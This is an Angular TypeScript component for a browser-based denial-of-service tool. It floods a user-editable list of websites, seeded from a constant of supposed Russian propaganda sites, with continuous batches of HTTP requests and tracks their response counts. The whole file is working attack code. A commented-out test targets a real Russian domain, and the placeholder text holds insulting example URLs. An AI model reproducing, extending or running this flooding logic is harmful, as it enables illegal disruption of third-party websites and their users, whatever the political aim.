import { HttpErrorResponse } from '@angular/common/http';
import { Component } from '@angular/core';
import { take } from 'rxjs';
import { AttackInfo, RUSSIAN_PROPAGANDA_SITES, validURL } from './shared/http.model';
import { HttpService } from './shared/http.service';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  siteAttackInfos: AttackInfo[];
  isProcessing: boolean = false;
  constructor(private httpService: HttpService) {
    this.siteAttackInfos = [...RUSSIAN_PROPAGANDA_SITES].map(site => new AttackInfo(site));
  }

  onStopStart() {
    this.isProcessing = !this.isProcessing;
    if(this.isProcessing){
      this.doDosAttack();
    }
    
  }
  doDosAttack() {
    
    this.doDosAttackPortion(10);
    if (!this.isProcessing) {
      return;
    }
    setTimeout(() => {
      this.doDosAttack();
    }, 0);
    
  }

  //   doDosAttackTest() {
    
  //     this.httpService.DoRequest("https://msk.rt.ru/").pipe(take(1))
  //     .subscribe({
  //       next: (v) => this.onSuccess(this.siteAttackInfos[0]),
  //       error: (e) => this.onError(this.siteAttackInfos[0], e)
  //     });
    
  // }

  doDosAttackPortion(count: number) {
    for (let index = 0; index < count; index++) {
      for (const siteAttackInfo of this.siteAttackInfos) {
        this.httpService.DoRequest(siteAttackInfo.siteUrl).pipe(take(1))
          .subscribe({
            next: (v) => this.onSuccess(siteAttackInfo),
            error: (e) => this.onError(siteAttackInfo, e)
          });
        ++siteAttackInfo.numberOfPendingRequests;
      }
    }

  }

  onSuccess(attackInfo: AttackInfo) {
    --attackInfo.numberOfPendingRequests;
    ++attackInfo.numberOfCompletedRequests;
    
  }

  onError(attackInfo: AttackInfo, error: HttpErrorResponse ) {
    --attackInfo.numberOfPendingRequests;
    ++attackInfo.numberOfCompletedRequests;
    if(error.status!=200){
      ++attackInfo.numberOfErrorResponses;
      console.log(error)
    }
  }

  stringify(obj: any) {
    return JSON.stringify(obj);
  }

  onAddPropagandaSitesClicked(siteUrlsString: string){
    if(!siteUrlsString){}
     const siteUrls = siteUrlsString.split(/\r?\n/);
     const newAttackInfos =  siteUrls.map(siteUrl=>new AttackInfo(siteUrl));
     this.siteAttackInfos.push(...newAttackInfos);
  }

  removeSite(index: number){
    this.siteAttackInfos.splice(index, 1);
  }


  placeholder = "Example:\nhttp://putinhuilo.ru\nhttps://putinloh.ru"

}
